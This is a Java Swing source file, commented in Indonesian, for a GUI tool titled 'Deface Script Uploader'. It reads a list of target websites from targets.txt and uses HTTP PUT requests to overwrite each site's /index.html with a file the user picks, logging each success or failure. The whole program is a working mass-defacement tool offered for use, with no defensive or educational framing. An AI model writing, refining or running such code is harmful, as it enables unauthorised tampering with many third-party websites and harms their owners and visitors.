import javax.swing.*;
import javax.swing.text.*;
import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.net.URI;
import java.net.http.*;
import java.net.http.HttpRequest.BodyPublishers;
import java.nio.file.*; 
import java.util.*;
import java.util.List;
import java.util.concurrent.*; 

public class zreechdav extends JFrame {
    // Komponen zreechdav
    private JTextPane logPane; // Ganti JTextArea dengan JTextPane
    private JTextField fileField;
    private JLabel browseLabel, startLabel;
    private JProgressBar progressBar;
    private JLabel statusLabel;
    private JPanel bannerPanel; 

    // Variabel kontrol
    private volatile boolean isRunning = false;
    private Future<?> animationFuture;

    // Warna
    private static final Color DARK_BG = new Color(30, 30, 40);
    private static final Color LIGHT_TEXT = new Color(220, 220, 255);
    private static final Color BUTTON_GREEN = new Color(0, 100, 0);
    private static final Color SUCCESS = new Color(50, 205, 50);
    private static final Color ERROR = new Color(220, 60, 60);

    public zreechdav() {
        // Konfigurasi frame utama
        setTitle("Deface Script Uploader");
        setSize(800, 600);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLocationRelativeTo(null);
        getContentPane().setBackground(DARK_BG);
        setLayout(new BorderLayout(10, 10));

        // Banner panel dengan icon dan nama aplikasi
        bannerPanel = new JPanel(new BorderLayout());
        bannerPanel.setBackground(DARK_BG);
        bannerPanel.setBorder(BorderFactory.createEmptyBorder(10, 0, 10, 0));

        try {
            // Load icon
            ImageIcon icon = new ImageIcon("resource/icon.png");
            JLabel iconLabel = new JLabel(icon);
            iconLabel.setBorder(BorderFactory.createEmptyBorder(0, 20, 0, 10));
            bannerPanel.add(iconLabel, BorderLayout.WEST);

            // Load nama aplikasi
            ImageIcon nameIcon = new ImageIcon("resource/name.png");
            JLabel nameLabel = new JLabel(nameIcon);
            bannerPanel.add(nameLabel, BorderLayout.CENTER);
        } catch (Exception e) {
            // Fallback text jika gambar tidak ditemukan
            JLabel textLabel = new JLabel("Deface Script Uploader");
            textLabel.setForeground(LIGHT_TEXT);
            textLabel.setFont(new Font("SansSerif", Font.BOLD, 20));
            textLabel.setHorizontalAlignment(SwingConstants.CENTER);
            bannerPanel.add(textLabel, BorderLayout.CENTER);
        }

        add(bannerPanel, BorderLayout.NORTH);

        JPanel inputPanel = new JPanel(new BorderLayout(5, 5));
        inputPanel.setBackground(DARK_BG);
        inputPanel.setBorder(BorderFactory.createEmptyBorder(10, 20, 10, 20));

        JLabel fileLabel = new JLabel("Script File:");
        fileLabel.setForeground(LIGHT_TEXT);
        fileLabel.setFont(new Font("SansSerif", Font.BOLD, 14));

        fileField = new JTextField();
        fileField.setBackground(new Color(50, 50, 60));
        fileField.setForeground(LIGHT_TEXT);
        fileField.setCaretColor(LIGHT_TEXT);
        fileField.setBorder(BorderFactory.createLineBorder(new Color(80, 80, 100), 1));

        // Label untuk Browse (menggantikan button)
        browseLabel = new JLabel("Browse...");
        styleClickableLabel(browseLabel);
        browseLabel.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                browseFile();
            }

            @Override
            public void mouseEntered(MouseEvent e) {
                browseLabel.setBackground(BUTTON_GREEN.brighter());
            }

            @Override
            public void mouseExited(MouseEvent e) {
                browseLabel.setBackground(BUTTON_GREEN);
            }
        });

        JPanel filePanel = new JPanel(new BorderLayout(5, 0));
        filePanel.setBackground(DARK_BG);
        filePanel.add(fileLabel, BorderLayout.WEST);
        filePanel.add(fileField, BorderLayout.CENTER);
        filePanel.add(browseLabel, BorderLayout.EAST);

        // Label untuk Start/Stop (menggantikan button)
        startLabel = new JLabel("Start Upload");
        styleClickableLabel(startLabel);
        startLabel.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                startUpload();
            }

            @Override
            public void mouseEntered(MouseEvent e) {
                if (isRunning) {
                    startLabel.setBackground(ERROR.brighter());
                } else {
                    startLabel.setBackground(BUTTON_GREEN.brighter());
                }
            }

            @Override
            public void mouseExited(MouseEvent e) {
                if (isRunning) {
                    startLabel.setBackground(ERROR);
                } else {
                    startLabel.setBackground(BUTTON_GREEN);
                }
            }
        });

        inputPanel.add(filePanel, BorderLayout.CENTER);
        inputPanel.add(startLabel, BorderLayout.SOUTH);

        add(inputPanel, BorderLayout.NORTH);

        // Panel log
        JPanel logPanel = new JPanel(new BorderLayout());
        logPanel.setBorder(BorderFactory.createEmptyBorder(0, 20, 10, 20));
        logPanel.setBackground(DARK_BG);

        JLabel logLabel = new JLabel("Upload Log:");
        logLabel.setForeground(LIGHT_TEXT);
        logLabel.setFont(new Font("SansSerif", Font.BOLD, 14));

        // Ganti JTextArea dengan JTextPane untuk dukungan warna teks
        logPane = new JTextPane();
        logPane.setEditable(false);
        logPane.setBackground(new Color(40, 40, 50));
        logPane.setForeground(LIGHT_TEXT);
        logPane.setFont(new Font("Monospaced", Font.PLAIN, 12));
        logPane.setBorder(BorderFactory.createLineBorder(new Color(80, 80, 100), 1));

        JScrollPane scrollPane = new JScrollPane(logPane);
        scrollPane.setBorder(BorderFactory.createLineBorder(new Color(80, 80, 100), 1));

        logPanel.add(logLabel, BorderLayout.NORTH);
        logPanel.add(scrollPane, BorderLayout.CENTER);

        add(logPanel, BorderLayout.CENTER);

        // Panel status
        JPanel statusPanel = new JPanel(new BorderLayout(5, 5));
        statusPanel.setBorder(BorderFactory.createEmptyBorder(0, 20, 15, 20));
        statusPanel.setBackground(DARK_BG);

        progressBar = new JProgressBar();
        progressBar.setForeground(BUTTON_GREEN);
        progressBar.setBackground(new Color(50, 50, 60));
        progressBar.setStringPainted(true);

        statusLabel = new JLabel("Ready");
        statusLabel.setForeground(LIGHT_TEXT);
        statusLabel.setFont(new Font("SansSerif", Font.PLAIN, 12));

        statusPanel.add(progressBar, BorderLayout.CENTER);
        statusPanel.add(statusLabel, BorderLayout.SOUTH);

        add(statusPanel, BorderLayout.SOUTH);

        // Tampilkan zreechdav
        setVisible(true);
    }

    private void styleClickableLabel(JLabel label) {
        label.setOpaque(true);
        label.setBackground(BUTTON_GREEN);
        label.setForeground(Color.WHITE);
        label.setFont(new Font("SansSerif", Font.BOLD, 13));
        label.setBorder(BorderFactory.createEmptyBorder(5, 15, 5, 15));
        label.setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));
        label.setHorizontalAlignment(SwingConstants.CENTER);
    }

    private void browseFile() {
        JFileChooser fileChooser = new JFileChooser();
        fileChooser.setCurrentDirectory(new File(System.getProperty("user.dir")));
        int result = fileChooser.showOpenDialog(this);

        if (result == JFileChooser.APPROVE_OPTION) {
            File selectedFile = fileChooser.getSelectedFile();
            fileField.setText(selectedFile.getAbsolutePath());
        }
    }

    private void startUpload() {
        if (isRunning) {
            stopUpload();
            return;
        }

        String fileName = fileField.getText().trim();
        if (fileName.isEmpty()) {
            JOptionPane.showMessageDialog(this, "Please select a script file",
                    "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }

        if (!Files.exists(Paths.get(fileName))) {
            JOptionPane.showMessageDialog(this, "File not found: " + fileName,
                    "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }

        // Persiapan upload
        isRunning = true;
        startLabel.setText("Stop Upload");
        startLabel.setBackground(ERROR);
        logPane.setText("");
        statusLabel.setText("Preparing upload...");

        // Jalankan proses upload di thread terpisah
        new UploadWorker(fileName).execute();
    }

    private void stopUpload() {
        isRunning = false;
        if (animationFuture != null) {
            animationFuture.cancel(true);
        }
        startLabel.setText("Start Upload");
        startLabel.setBackground(BUTTON_GREEN);
        statusLabel.setText("Upload stopped by user");
    }

    private class UploadWorker extends SwingWorker<Void, String> {
        private final String fileName;
        private List<String> targets;
        private int totalTargets;

        public UploadWorker(String fileName) {
            this.fileName = fileName;
        }

        @Override
        protected Void doInBackground() throws Exception {
            // Baca target
            try {
                targets = Files.readAllLines(Paths.get("targets.txt"));
                totalTargets = targets.size();
            } catch (IOException e) {
                publish("ERROR: targets.txt not found in current directory");
                return null;
            }

            publish("Starting upload to " + totalTargets + " targets...\n");

            // Setup progress bar
            SwingUtilities.invokeLater(() -> {
                progressBar.setMaximum(totalTargets);
                progressBar.setValue(0);
            });

            // Animasi loading
            animationFuture = Executors.newSingleThreadExecutor().submit(this::animateProgress);

            // Proses upload
            HttpClient client = HttpClient.newHttpClient();
            String fileContent = new String(Files.readAllBytes(Paths.get(fileName)));

            for (int i = 0; i < targets.size() && isRunning; i++) {
                String web = targets.get(i).trim();
                try {
                    String site = web.startsWith("http://") || web.startsWith("https://") ? web : "http://" + web;

                    HttpRequest request = HttpRequest.newBuilder()
                            .uri(URI.create(site + "/index.html"))
                            .PUT(BodyPublishers.ofString(fileContent))
                            .build();

                    HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                    String logEntry;
                    if (response.statusCode() >= 200 && response.statusCode() < 300) {
                        logEntry = "[SUCCESS] " + site + "/index.html";
                    } else {
                        logEntry = "[FAILED] " + site + "/index.html - Status: " + response.statusCode();
                    }
                    publish(logEntry);
                } catch (Exception ex) {
                    publish("[ERROR] " + web + " - " + ex.getMessage());
                }

                final int progress = i + 1;
                SwingUtilities.invokeLater(() -> progressBar.setValue(progress));
            }

            isRunning = false;
            return null;
        }

        @Override
        protected void process(List<String> chunks) {
            StyledDocument doc = logPane.getStyledDocument();
            SimpleAttributeSet defaultAttr = new SimpleAttributeSet();
            StyleConstants.setForeground(defaultAttr, LIGHT_TEXT);
            StyleConstants.setFontFamily(defaultAttr, "Monospaced");

            for (String message : chunks) {
                try {
                    // Buat atribut untuk setiap tipe pesan
                    SimpleAttributeSet attr = new SimpleAttributeSet();

                    if (message.startsWith("[SUCCESS]")) {
                        StyleConstants.setForeground(attr, SUCCESS);
                    } else if (message.startsWith("[FAILED]")) {
                        StyleConstants.setForeground(attr, ERROR);
                    } else if (message.startsWith("[ERROR]")) {
                        StyleConstants.setForeground(attr, ERROR);
                    } else {
                        attr = defaultAttr;
                    }

                    // Tambahkan pesan ke dokumen dengan atribut yang sesuai
                    doc.insertString(doc.getLength(), message + "\n", attr);

                    // Auto-scroll
                    logPane.setCaretPosition(doc.getLength());
                } catch (BadLocationException e) {
                    e.printStackTrace();
                }
            }
        }

        @Override
        protected void done() {
            isRunning = false;
            if (animationFuture != null) {
                animationFuture.cancel(true);
            }

            startLabel.setText("Start Upload");
            startLabel.setBackground(BUTTON_GREEN);
            statusLabel.setText("Upload completed");

            try {
                if (!isCancelled()) {
                    get();
                    publish("\nFinished! Processed " + progressBar.getValue() + "/" + totalTargets + " targets");
                }
            } catch (Exception ex) {
                publish("\nERROR: " + ex.getMessage());
            }
        }

        private void animateProgress() {
            String[] animation = { "|", "/", "-", "\\" };
            int i = 0;

            while (isRunning) {
                try {
                    String status = "Processing " + progressBar.getValue() + "/" + totalTargets + " " + animation[i];
                    SwingUtilities.invokeLater(() -> statusLabel.setText(status));

                    i = (i + 1) % animation.length;
                    Thread.sleep(150);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return;
                }
            }
        }
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> {
            try {
                UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
            } catch (Exception e) {
                // Gunakan default look and feel
            }
            new zreechdav();
        });
    }
}
